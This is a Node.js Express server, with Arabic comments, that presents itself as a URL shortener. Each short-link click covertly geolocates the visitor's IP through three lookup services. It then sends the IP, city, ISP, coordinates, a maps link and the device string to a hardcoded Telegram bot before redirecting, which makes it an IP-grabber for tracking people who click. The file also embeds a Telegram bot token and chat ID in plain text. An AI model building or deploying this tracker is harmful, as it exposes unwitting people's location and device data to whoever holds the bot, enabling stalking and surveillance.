const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

const TELEGRAM_BOT_TOKEN = '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
const TELEGRAM_CHAT_ID = '5942654805';

const linkStorage = {};

function generateShortCode() {
  return crypto.randomBytes(4).toString('hex');
}

async function getLocation(ip) {
  // الطريقة 1: geojs
  try {
    const res = await axios.get(`https://get.geojs.io/v1/ip/geo/${ip}.json`, { timeout: 2000 });
    if (res.data && res.data.country_name) {
      return {
        country: res.data.country_name,
        city: res.data.city || 'N/A',
        latitude: res.data.latitude,
        longitude: res.data.longitude,
        isp: res.data.organization || 'N/A',
        source: 'geojs'
      };
    }
  } catch (e) { console.log('geojs fail'); }

  // الطريقة 2: ipstack (مجاني)
  try {
    const res = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 2000 });
    if (res.data && res.data.status === 'success') {
      return {
        country: res.data.country,
        city: res.data.city,
        latitude: res.data.lat,
        longitude: res.data.lon,
        isp: res.data.isp,
        source: 'ip-api'
      };
    }
  } catch (e) { console.log('ip-api fail'); }

  // الطريقة 3: ipwhois
  try {
    const res = await axios.get(`https://ipwhois.app/json/${ip}`, { timeout: 2000 });
    if (res.data && res.data.country) {
      return {
        country: res.data.country,
        city: res.data.city || 'N/A',
        latitude: res.data.latitude,
        longitude: res.data.longitude,
        isp: res.data.isp || 'N/A',
        source: 'ipwhois'
      };
    }
  } catch (e) { console.log('ipwhois fail'); }

  return null;
}

async function sendToTelegram(ip, shortCode, originalUrl, userAgent) {
  try {
    const location = await getLocation(ip);

    let msg = `
🔗 رابط جديد!
━━━━━━━━
📌 Code: ${shortCode}
🌐 Link: ${originalUrl}
🔌 IP: ${ip}
`;

    if (location) {
      msg += `
📍 Country: ${location.country}
🏙️ City: ${location.city}
🌍 ISP: ${location.isp}
📊 Lat: ${location.latitude}
📊 Lng: ${location.longitude}
🗺️ Maps: https://maps.google.com/?q=${location.latitude},${location.longitude}
📡 Source: ${location.source}
`;
    } else {
      msg += `
⚠️ Location: Failed to retrieve
`;
    }

    msg += `
🖥️ Device: ${userAgent.substring(0, 50)}
⏰ Time: ${new Date().toISOString()}
    `.trim();

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      { chat_id: TELEGRAM_CHAT_ID, text: msg }
    );
  } catch (err) {
    console.error('Error:', err.message);
  }
}

app.post('/api/shorten', (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'URL required' });

  const shortCode = generateShortCode();
  linkStorage[shortCode] = { original: url, created: new Date(), clicks: 0 };

  const shortenedUrl = `${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/${shortCode}`;
  res.json({ shortened: shortenedUrl, code: shortCode });
});

app.get('/:code', (req, res) => {
  const { code } = req.params;
  if (!linkStorage[code]) return res.status(404).send('Not found');

  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.get('user-agent');
  const originalUrl = linkStorage[code].original;

  linkStorage[code].clicks++;
  sendToTelegram(ip, code, originalUrl, userAgent);
  res.redirect(originalUrl);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Running on ${PORT}`));